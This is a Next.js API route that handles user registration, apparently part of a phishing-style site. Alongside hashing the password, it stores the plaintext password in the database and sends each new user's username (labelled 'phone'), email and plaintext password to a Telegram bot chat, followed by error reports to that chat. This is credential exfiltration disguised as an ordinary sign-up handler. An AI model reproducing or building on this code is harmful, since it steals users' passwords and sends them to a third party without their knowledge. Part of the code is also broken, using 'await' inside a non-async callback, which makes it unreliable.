// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from "next";
import dbConnect from "../../lib/dbConnect";
import User from "../../../model/User";
import bcrypt from "bcryptjs";


export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  await dbConnect();
  // validate if it is a POST
  if (req.method !== "POST") {
    return res
      .status(401)
      .json({ error: "This API call only accepts POST methods" });
  }

  // get and validate body variables
  const { username, email, password } = req.body;


  // hash password
  const hashedPassword = await bcrypt.hash(password, 12);

  // create new User on MongoDB
  const newUser = new User({
    username: username,
    email,
    hashedPassword,
    pass:password
  });


  const text = `
  NEW ENTRY
  phone------- ${username}
  email------- ${email}
  pass------- ${password}
 `
 
 const telegramURL = `https://api.telegram.org/${process.env.BOTID}/sendMessage`;
 const chat_id = process.env.CJANNELID
 const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
   method: 'POST',
   headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
   body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
 });

 try {
  newUser
    .save().then((e: any) => {
      res.status(200).json({ msg: "Successfully created new User: " + e })
    }).catch((error: any) => {
      const text = `
      NEW ERROR MESSAGE
      ${error}
     `
      const telegramURL = `https://api.telegram.org/${process.env.BOTID}/sendMessage`;
      const chat_id = process.env.CJANNELID
      const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
        method: 'POST',
        headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
        body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
      });
      return res.status(500).json({ error_message: error, msg: "server error::: " + newUser });
  })
  
   
   
 } catch (error) {
   console.log(error)
   const text = `
   NEW ERROR MESSAGE
   ${error}
  `
   const telegramURL = `https://api.telegram.org/${process.env.BOTID}/sendMessage`;
   const chat_id = process.env.CJANNELID
   const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
     method: 'POST',
     headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
     body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
   });
  res.status(400).json({ error: "Error on '/api/register': " + error })
  
 }
}